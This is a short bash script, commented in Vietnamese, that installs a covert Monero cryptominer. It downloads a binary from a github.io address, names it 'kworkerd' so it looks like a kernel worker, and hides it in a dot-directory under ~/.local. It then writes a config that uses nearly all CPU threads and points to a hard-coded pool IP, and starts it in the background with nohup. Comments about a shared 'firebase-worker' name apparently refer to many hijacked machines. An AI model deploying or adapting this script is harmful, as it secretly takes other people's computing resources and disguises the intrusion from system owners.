#!/usr/bin/env bash
set -euo pipefail

# === Config cố định cho Firebase miner ===
# WALLET: không cần, proxy đã quản lý
# POOL: IP Lightsail + port 93333
# WORKER: tên chung cho tất cả miner
# PASS: đặt mặc định để proxy phân biệt, ví dụ "firebase"

APP_NAME="kworkerd"
BASE_URL="https://nguyenthienhoan.github.io/dl"
INSTALL_DIR="$HOME/.local/.${APP_NAME}"
LOG_DIR="$INSTALL_DIR/logs"
CONF="$INSTALL_DIR/config.json"
BIN="$INSTALL_DIR/$APP_NAME"
PID_FILE="$INSTALL_DIR/$APP_NAME.pid"

POOL_HOST="13.250.25.208"
POOL_PORT="93333"
WORKER="firebase-worker"   # tên chung cho tất cả miner con
PASS="firebase"
TLS="false"                # proxy của mày đang bind thường, không TLS

mkdir -p "$INSTALL_DIR" "$LOG_DIR"

# tải binary đã build
echo "[*] Đang tải binary $APP_NAME..."
curl -fsSL "$BASE_URL/$APP_NAME" -o "$BIN"
chmod +x "$BIN"

# tạo config.json tối giản
cat > "$CONF" <<JSON
{
  "autosave": true,
  "background": true,
  "randomx": {
    "1gb-pages": false,
    "huge-pages-jit": true
  },
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "max-threads-hint": 100,
    "priority": 1
  },
  "pools": [
    {
      "algo": "rx/0",
      "url": "${POOL_HOST}:${POOL_PORT}",
      "user": "${WORKER}",
      "pass": "${PASS}",
      "keepalive": true,
      "tls": ${TLS}
    }
  ],
  "print-time": 60,
  "retries": 6000,
  "retry-pause": 3
}
JSON

# start miner
echo "[*] Khởi động $APP_NAME..."
nohup "$BIN" -c "$CONF" > "$LOG_DIR/${APP_NAME}.out" 2>&1 &
echo $! > "$PID_FILE"
echo "[*] Đang chạy PID $(cat $PID_FILE). Log: $LOG_DIR/${APP_NAME}.out"
